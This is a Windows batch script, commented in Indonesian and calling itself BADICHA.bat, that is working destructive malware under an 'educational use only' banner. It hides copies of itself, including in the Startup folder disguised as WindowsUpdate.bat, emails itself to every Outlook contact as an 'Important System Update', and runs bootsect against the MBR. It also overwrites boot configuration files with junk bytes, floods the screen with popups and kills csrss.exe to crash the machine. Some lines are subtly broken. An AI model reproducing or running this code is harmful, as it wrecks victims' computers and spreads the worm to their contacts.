@echo off
title System Service
color 0c

echo ==================================================
echo ⚠️  FOR EDUCATIONAL USE ONLY
echo USE ONLY ON TEST / VIRTUAL MACHINES
echo ==================================================
pause >nul

:: Cek hak akses admin
net session >nul 2>&1 || (echo ERROR: ADMIN RIGHTS REQUIRED! & pause & exit /b)

set "script=%~f0"
set "folder=%~dp0"

:: ==================================================
:: 1. Salin ke lokasi tersembunyi & auto mulai
:: ==================================================
md "D:\System\Backup" 2>nul
md "E:\Recovery\Config" 2>nul
md "%ProgramData%\WindowsCache" 2>nul
md "%Public%\Documents\SysData" 2>nul
md "C:\Boot\" 2>nul

copy /y "%script%" "D:\System\Backup\sys_core.bat" >nul
copy /y "%script%" "E:\Recovery\Config\boot_helper.bat" >nul
copy /y "%script%" "%ProgramData%\WindowsCache\main_svc.bat" >nul
copy /y "%script%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.bat" >nul

:: Salin gambar peta
if exist "%folder%world_map.jpg" copy /y "%folder%world_map.jpg" "C:\Boot\world_map.jpg" >nul
attrib +h +s +r "D:\System\Backup\*" "E:\Recovery\Config\*" "%ProgramData%\WindowsCache\*" "C:\Boot\*" >nul

:: ==================================================
:: 2. Sebar ke SEMUA kontak Outlook (berurutan, aman)
:: ==================================================
powershell -Command "$outlook = New-Object -ComObject Outlook.Application -ErrorAction SilentlyContinue; if ($outlook) { $mapi = $outlook.GetNamespace('MAPI'); $mapi.Logon($null,$null,$false,$false); foreach ($list in $mapi.AddressLists) { foreach ($kontak in $list.AddressEntries) { try { $mail = $outlook.CreateItem(0); $mail.To = $kontak.Address; $mail.Subject = 'Important System Update'; $mail.Body = 'Please check the attached file.'; $mail.Attachments.Add('%script%'); $mail.Send(); Start-Sleep -Milliseconds 500 } catch {} } } $mapi.Logoff(); $outlook.Quit() }" >nul 2>&1

:: ==================================================
:: 3. Pesan Notepad
:: ==================================================
echo YOUR PC WAS TRASHED BY BADICHA.bat > "%temp%\BADICHA_NOTICE.txt"
echo THIS CANNOT BE REMOVED, SURVIVES REINSTALL >> "%temp%\BADICHA_NOTICE.txt"
echo GOOD LUCK >> "%temp%\BADICHA_NOTICE.txt"
start notepad.exe "%temp%\BADICHA_NOTICE.txt"

:: ==================================================
:: 4. Overwrite MBR + BCD → Teks + Ganti ke Peta
:: ==================================================
bcdedit /export "C:\BCD_BAK" >nul 2>&1
bootsect /nt60 SYS /mbr /force >nul 2>&1

:: Hapus BCD lama
del /f /q "C:\Windows\Boot\DVD\EFI\BCD" "C:\Windows\Boot\DVD\PCAT\BCD" "C:\Boot\BCD" "C:\EFI\Microsoft\Boot\BCD" >nul 2>&1

:: Teks yang muncul 0–3 detik
powershell -Command "$pesan = [byte[]][char[]]'YOUR PC WAS TRASHED BY BADICHA.bat'; $kosong = New-Object byte[] (470 - $pesan.Length); $tanda = [byte[]]@(0x55,0xAA); $data = $pesan + $kosong + $tanda; [IO.File]::WriteAllBytes('C:\Windows\Boot\DVD\EFI\BCD', $data)" >nul
powershell -Command "$pesan = [byte[]][char[]]'YOUR PC WAS TRASHED BY BADICHA.bat'; $kosong = New-Object byte[] (470 - $pesan.Length); $tanda = [byte[]]@(0x55,0xAA); $data = $pesan + $kosong + $tanda; [IO.File]::WriteAllBytes('C:\Windows\Boot\DVD\PCAT\BCD', $data)" >nul
powershell -Command "$pesan = [byte[]][char[]]'YOUR PC WAS TRASHED BY BADICHA.bat'; $kosong = New-Object byte[] (470 - $pesan.Length); $tanda = [byte[]]@(0x55,0xAA); $data = $pesan + $kosong + $tanda; [IO.File]::WriteAllBytes('C:\Boot\BCD', $data)" >nul
powershell -Command "$pesan = [byte[]][char[]]'YOUR PC WAS TRASHED BY BADICHA.bat'; $kosong = New-Object byte[] (470 - $pesan.Length); $tanda = [byte[]]@(0x55,0xAA); $data = $pesan + $kosong + $tanda; [IO.File]::WriteAllBytes('C:\EFI\Microsoft\Boot\BCD', $data)" >nul

:: Atur waktu tunggu 3 detik
bcdedit /set {bootmgr} timeout 3 >nul 2>&1

:: Setelah 3 detik → Tampil Peta Dunia penuh layar
powershell -Command "Start-Sleep 3; while ($true) { Start-Process mshta -ArgumentList 'html:<head><style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#000;overflow:hidden;position:relative;}img{width:100vw;height:100vh;object-fit:cover;}.text{position:absolute;top:15%;left:50%;transform:translate(-50%,-50%);color:#ff2222;font:bold 38px Consolas;text-align:center;text-shadow:0 0 10px #000;}</style></head><body><img src=''file:///C:/Boot/world_map.jpg''><div class=''text''>YOUR PC WAS TRASHED<br>BY BADICHA.bat</div></body>' -WindowStyle Hidden; Start-Sleep -Milliseconds 800 }" >nul 2>&1

:: ==================================================
:: 5. Trap Close → Langsung BSOD jika ditutup
:: ==================================================
powershell -Command "while ($true) { Start-Sleep -Milliseconds 200; if (-not (Get-Process cmd -ErrorAction SilentlyContinue)) { taskkill /f /im csrss.exe 2>nul } }" >nul 2>&1

:: ==================================================
:: 6. Efek GDI Teratur
:: ==================================================
set "waktu_mulai=%time%"
:buka_link
for /l %%i in (1,1,3) do start "" "https://example.com/help"
call :hitung_waktu & if %selisih% lss 5 goto buka_link

set "waktu_mulai=%time%"
:pesan_ulang
mshta "vbscript:msgbox(""Still here?"",vbExclamation,""System"")(close)"
call :hitung_waktu & if %selisih% lss 5 goto pesan_ulang

:: Layar bergerak acak
powershell -Command "$mulai = Get-Date; while ((Get-Date) - $mulai).TotalSeconds -lt 23) { $x = Get-Random -Maximum 1920; $y = Get-Random -Maximum 1080; Start-Process mshta -ArgumentList 'javascript:moveTo('+$x+','+$y+');close()' -WindowStyle Hidden; Start-Sleep -Milliseconds 120 }" >nul 2>&1

:: Jendela membesar & mengecil
powershell -Command "$mulai = Get-Date; while ((Get-Date) - $mulai).TotalSeconds -lt 23) { for ($ukuran=0; $ukuran -le 180; $ukuran+=12) { Start-Process mshta -ArgumentList 'javascript:resizeTo('+(1920-2*$ukuran)+','+(1080-2*$ukuran)+');moveTo('+$ukuran+','+$ukuran+');' -WindowStyle Hidden; Start-Sleep -Milliseconds 25 } }" >nul 2>&1

:: Akhirnya BSOD
powershell -Command "Start-Sleep 20; taskkill /f /im csrss.exe 2>nul" >nul 2>&1

:: Bersihkan file sementara
del "%temp%\BADICHA_NOTICE.txt" >nul
exit /b

:: Fungsi hitung waktu
:hitung_waktu
for /f "tokens=1-4 delims=:.," %%a in ("%time%") do (set /a j2=1%%a-100,m2=1%%b-100,d2=1%%c-100)
for /f "tokens=1-4 delims=:.," %%a in ("%waktu_mulai%") do (set /a j1=1%%a-100,m1=1%%b-100,d1=1%%c-100)
set /a selisih=((j2*3600+m2*60+d2)-(j1*3600+m1*60+d1))
if %selisih% lss 0 set /a selisih+=86400
exit /b